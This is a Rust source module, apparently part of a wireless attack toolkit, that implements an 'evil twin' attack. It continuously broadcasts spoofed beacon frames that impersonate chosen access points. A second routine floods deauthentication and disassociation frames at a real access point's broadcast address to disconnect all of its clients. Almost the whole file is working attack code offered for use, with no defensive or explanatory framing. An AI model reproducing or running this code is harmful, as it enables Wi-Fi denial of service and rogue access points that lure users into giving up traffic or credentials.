use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};
use std::time::{SystemTime, UNIX_EPOCH};

const RADIOTAP: [u8; 12] = [0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

fn build_deauth_frame(bssid: &[u8; 6], station: &[u8; 6], frame_type: u8) -> Vec<u8> {
    let mut buf = RADIOTAP.to_vec();
    buf.push(frame_type); buf.push(0x00);
    buf.push(0x3A); buf.push(0x01);
    buf.extend_from_slice(station);
    buf.extend_from_slice(bssid);
    buf.extend_from_slice(bssid);
    buf.push(0x00); buf.push(0x00);
    buf.push(0x03); buf.push(0x00);
    buf
}

pub struct EviltwinV2 {
    iface: String,
    running: Arc<AtomicBool>,
    sent: Arc<AtomicU64>,
    handle: Option<JoinHandle<()>>,
    deauth_running: Arc<AtomicBool>,
    deauth_sent: Arc<AtomicU64>,
    deauth_handle: Option<JoinHandle<()>>,
}

impl EviltwinV2 {
    pub fn new(iface: &str, pairs: Vec<(String, String)>, channel: u8) -> Option<Self> {
        if pairs.is_empty() { return None; }
        for (_, bssid) in &pairs { let _ = parse_mac(bssid)?; }

        let running = Arc::new(AtomicBool::new(true));
        let sent = Arc::new(AtomicU64::new(0));
        let r = running.clone();
        let s = sent.clone();
        let iface_own = iface.to_string();

        let handle = thread::spawn(move || {
            let sock = match crate::raw_injector::RawSocket::open(&iface_own) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[EviltwinV2] Socket error: {}", e);
                    return;
                }
            };

            let mut frames: Vec<Vec<u8>> = Vec::with_capacity(pairs.len());
            for (ssid, bssid) in &pairs {
                let mut frame = RADIOTAP.to_vec();
                frame.extend_from_slice(&crate::capture_engine::build_beacon_frame(
                    ssid, bssid, channel,
                ));
                frames.push(frame);
            }

            let count = frames.len();
            let mut idx = 0usize;
            let mut seq = 0u16;
            while r.load(Ordering::Relaxed) {
                if let Some(frame) = frames.get_mut(idx % count) {
                    let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_micros() as u64;
                    frame[8..12].copy_from_slice(&(ts as u32).to_le_bytes());
                    let sc = (seq & 0xFFF) << 4;
                    frame[34] = (sc & 0xFF) as u8;
                    frame[35] = ((sc >> 8) & 0xFF) as u8;
                    seq = (seq + 1) & 0xFFF;
                    if sock.send(frame).is_ok() {
                        let total = s.fetch_add(1, Ordering::Relaxed);
                        if total % 1000 == 0 {
                            eprintln!("[EviltwinV2] beacon {} APs total={}", count, total);
                        }
                    }
                }
                idx += 1;
            }
        });

        Some(EviltwinV2 {
            iface: iface.to_string(),
            running,
            sent,
            handle: Some(handle),
            deauth_running: Arc::new(AtomicBool::new(false)),
            deauth_sent: Arc::new(AtomicU64::new(0)),
            deauth_handle: None,
        })
    }

    pub fn stop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
        self.deauth_running.store(false, Ordering::Relaxed);
        if let Some(h) = self.handle.take() { let _ = h.join(); }
        if let Some(h) = self.deauth_handle.take() { let _ = h.join(); }
    }

    pub fn total(&self) -> u64 { self.sent.load(Ordering::Relaxed) }
    pub fn deauth_total(&self) -> u64 { self.deauth_sent.load(Ordering::Relaxed) }

    pub fn start_deauth(&mut self, real_bssid: String) {
        let Some(bssid_bytes) = parse_mac(&real_bssid) else { return };
        if self.deauth_running.swap(true, Ordering::Relaxed) { return; }

        let r = self.deauth_running.clone();
        let s = self.deauth_sent.clone();
        let iface_clone = self.iface.clone();
        let bssid_own = real_bssid;

        self.deauth_handle = Some(thread::spawn(move || {
            let sock = match crate::raw_injector::RawSocket::open(&iface_clone) {
                Ok(s) => s,
                Err(_) => return,
            };

            let broadcast = [0xFFu8; 6];
            let deauth_frame = build_deauth_frame(&bssid_bytes, &broadcast, 0xC0);
            let disassoc_frame = build_deauth_frame(&bssid_bytes, &broadcast, 0xA0);

            while r.load(Ordering::Relaxed) {
                let _ = sock.send(&deauth_frame);
                let _ = sock.send(&disassoc_frame);
                let total = s.fetch_add(2, Ordering::Relaxed);
                if total % 2000 == 0 {
                    eprintln!("[EviltwinV2] deauth {} total={}", bssid_own, total);
                }
            }
        }));
    }

    pub fn stop_deauth(&mut self) {
        self.deauth_running.store(false, Ordering::Relaxed);
        if let Some(h) = self.deauth_handle.take() { let _ = h.join(); }
    }
}

fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 { return None; }
    let mut bytes = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(bytes)
}
